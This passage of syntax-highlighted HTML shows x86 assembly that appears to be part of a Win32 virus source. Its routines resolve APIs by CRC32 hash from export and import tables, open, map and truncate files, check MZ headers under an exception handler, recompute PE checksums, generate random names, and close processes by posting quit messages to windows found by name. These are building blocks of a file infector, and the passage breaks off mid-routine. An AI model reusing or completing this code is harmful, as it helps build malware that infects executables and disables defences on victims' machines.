    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = NameTable VA</span><span class="sc0">

</span><span class="sc5">@?_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Save again</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get pointer to an API name</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Store ptr in EDI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; And in EBX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Save EDI</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Pointer to API Name</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EDI = API Name size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Save API's CRC32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Get actual api's CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Restore API's CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Are them equal?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@?_4</span><span class="sc0">                            </span><span class="sc1">; if yes, we got it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Restore ptr to api name</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Get the next</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; And increase the counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@?_3</span><span class="sc0">                            </span><span class="sc1">; Get another api!</span><span class="sc0">
</span><span class="sc5">@?_4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Remove shit from stack</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AX = Counter</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; *2 (it's an array of words)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OrdinalTableVA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr 2 ordinal; EAX = 0</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; Get ordinal in AX</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; And with it we go to the</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AddressTable (array of</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; dwords)</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get Address of API RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; and normalize!! That's it!</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number to align</span><span class="sc0">
</span><span class="sc1">;       ECX = Alignment factor</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Aligned number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">Align</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">Align</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Offset where truncate</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TruncFile</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetEndOfFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TruncFile</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to the file where open</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle/INVALID_HANDLE_VALUE</span><span class="sc0">

</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size to map</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Mapping handle/Error</span><span class="sc0">

</span><span class="sc5">CreateMap</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CreateMap</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size to map</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Mapping address/Error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to the name of the window of the process we want to kill</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TerminateProc</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; Thnx 2 Bennyg0d :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindWindowA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TP_ErrorExit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000012h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_PostMessageA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">TP_ErrorExit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TerminateProc</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to the code to process</span><span class="sc0">
</span><span class="sc1">;       EDI = Size of such code</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = CRC32 of that code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Optimized by me - 2 bytes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; less</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Another fool byte less</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Offset where check for MZ mark</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       CF  = Set if fail, clear if all ok.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CheckMZ</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CMZ_SetSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CMZ_Exit</span><span class="sc0">
</span><span class="sc5">CMZ_SetSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CMZ_Exit</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CMZ_Exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Thanx 2 Super for pointing</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; me a bug here :)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckMZ</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       TOS+00 = Return Address</span><span class="sc0">
</span><span class="sc1">;       TOS+04 = Size of what we want to know the checksum</span><span class="sc0">
</span><span class="sc1">;       TOS+08 = Address where begin to calculate checksum</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Checksum</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">dwFileLen</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">lpFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dwFileLen</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@CSumLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@CSumLoop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwFileLen</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI = Where generate the 6 char string</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GenerateName</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">                               </span><span class="sc1">; Generate in [EDI] a 6 char</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; name</span><span class="sc0">
</span><span class="sc5">gcl00p</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenChar</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gcl00p</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenChar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">                          </span><span class="sc1">; Generate letter between</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25d</span><span class="sc0">                          </span><span class="sc1">; A and Z :]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenerateName</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = CRC32 of the API we want to get info</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = API address</span><span class="sc0">
</span><span class="sc1">;       EBX = API in Import Table</span><span class="sc0">

</span><span class="sc5">GetAPI_IT_CRC32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

